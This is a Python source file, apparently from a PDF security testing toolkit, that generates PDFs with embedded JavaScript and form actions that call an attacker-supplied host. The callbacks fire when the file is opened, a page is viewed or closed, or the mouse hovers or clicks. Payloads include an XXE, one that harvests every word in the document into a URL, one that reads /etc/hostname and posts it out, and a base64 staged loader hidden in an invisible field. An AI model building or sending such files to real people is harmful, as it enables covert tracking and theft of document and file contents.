"""JavaScript-based PDF phone-home generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme

from lib.pdf.generators.common import _js_callback_pdf

def write_js_open_doc(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')


def write_foxit_geturl_js(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
this.getURL("''' + host + '''/test10")
)>> trailer <</Root 1 0 R>>''')


def write_js_xxe_xmldata(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      try {
          XMLData.parse('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "''' + host + '''/test17">]><root>&xxe;</root>', false, true);
      } catch(e) {}
      )
      >>
  >>
>>''')


def write_paren_inject_js_action(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test18"), cFS: "CHTTP"})) /Type /Action >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'annot-inject') Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000850 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
970
%%EOF
''')


def write_annot_page_visible_js(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PV << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test19"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pv-auto'     ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


def write_annot_page_close_js(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PC << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test20"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pc-close'    ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


def write_submitform_exfil_pdf(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'submitpdf'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F (''' + host + '''/test21.pdf) /V true /FS /URL >>
     /Flags 256
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
900
%%EOF
''')


def write_js_submitform_pdf(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      this.submitForm({cURL: "''' + host + '''/test22", cSubmitAs: "PDF"});
      )
      >>
  >>
>>''')


def write_widget_btn_cover_js(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-btn'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Btn /T (a) >>
     /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test23"), cFS: "CHTTP"})) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
920
%%EOF
''')


def write_widget_tx_submitform(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'widget-tx'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 900 700]
     /Parent << /FT /Tx /T (foo) /V (bar) >>
     /A << /S /JavaScript /JS (this.submitForm("''' + host + '''/test24", false, false, ["foo"])) >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000560 00000 n
0000000680 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
930
%%EOF
''')


def write_get_page_nth_word_exfil(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 85 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (SECRET: The quick brown fox jumps) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (var w=[];for(var p=0;p<this.numPages;p++){for(var i=0;i<this.getPageNumWords(p);i++){w.push(this.getPageNthWord(p,i,true))}}app.openDoc({cPath:encodeURI("''' + host + '''/test25?d="+w.join("+")),cFS:"CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
950
%%EOF
''')


def write_annot_mouseover_js(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 900 900]
                 /AA << /E << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test26"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'mouseover'   ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000810 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
930
%%EOF
''')


def write_acrobat_js_submit_form(filename, host):
    _js_callback_pdf(filename, host,
        'this.submitForm({cURL: "' + host + '/acrobat-js-submit-form"})',
        'js-submitform')


def write_acrobat_js_get_url(filename, host):
    _js_callback_pdf(filename, host,
        'this.getURL("' + host + '/acrobat-js-get-url")',
        'js-geturl')


def write_acrobat_js_launch_url(filename, host):
    _js_callback_pdf(filename, host,
        'app.launchURL("' + host + '/acrobat-js-launch-url")',
        'js-launchurl')


def write_acrobat_js_media_geturl(filename, host):
    _js_callback_pdf(filename, host,
        'app.media.getURLData("' + host + '/acrobat-js-media-geturl", "audio/mp3")',
        'js-geturldata')


def write_acrobat_js_soap_connect(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.connect("' + host + '/acrobat-js-soap-connect")',
        'js-soap-connect')


def write_acrobat_js_soap_request(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.request({cURL:"' + host + '/acrobat-js-soap-request",oRequest:{},cAction:""})',
        'js-soap-request')


def write_acrobat_js_import_data(filename, host):
    _js_callback_pdf(filename, host,
        'this.importDataObject("file","' + host + '/acrobat-js-import-data")',
        'js-dataobject')


def write_acrobat_js_open_doc(filename, host):
    _js_callback_pdf(filename, host,
        'app.openDoc("' + host + '/acrobat-js-open-doc")',
        'js-opendoc')


def write_browser_js_fetch(filename, host):
    _js_callback_pdf(filename, host,
        'fetch("' + host + '/browser-js-fetch")',
        'js-fetch')


def write_browser_js_xhr(filename, host):
    _js_callback_pdf(filename, host,
        'var r=new XMLHttpRequest();r.open("GET","' + host + '/browser-js-xhr");r.send()',
        'js-xhr')


def write_browser_js_image(filename, host):
    _js_callback_pdf(filename, host,
        'var img=new Image(1,1);img.src="' + host + '/browser-js-image"',
        'js-img')


def write_browser_js_websocket(filename, host):
    ws_host = host.replace('https://', 'wss://').replace('http://', 'ws://')
    _js_callback_pdf(filename, host,
        'new WebSocket("' + ws_host + '/browser-js-websocket")',
        'js-ws')


def write_acrobat_js_rss_addfeed(filename, host):
    _js_callback_pdf(filename, host,
        'RSS.addFeed({cURL: "' + host + '/acrobat-js-rss-addfeed"})',
        'js-rss-addfeed')


def write_acrobat_js_readfile_chain(filename, host):
    _js_callback_pdf(filename, host,
        'try{var s=util.readFileIntoStream("/etc/hostname",0);'
        'SOAP.request({cURL:"' + host + '/acrobat-js-readfile",'
        'oRequest:{"x":util.stringFromStream(s)},cAction:""})}catch(e){'
        'SOAP.request({cURL:"' + host + '/acrobat-js-readfile-err",'
        'oRequest:{"e":e.toString()},cAction:""})}',
        'js-readfile')


def write_acrobat_js_field_staged(filename, host):
    inner_js = 'app.launchURL("' + host + '/acrobat-js-field-staged")'
    payload_b64 = base64.b64encode(inner_js.encode('latin-1')).decode('ascii')
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
     /OpenAction 6 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'staged-loader') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 0 0]
     /FT /Tx
     /T (btn1)
     /V (''' + payload_b64 + ''')
     /F 2
  >>
endobj

6 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (eval(util.stringFromStream(util.streamFromString(getField("btn1").value),"base64")))
  >>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000115 00000 n
0000000196 00000 n
0000000400 00000 n
0000000510 00000 n
0000000640 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
800
%%EOF
''')
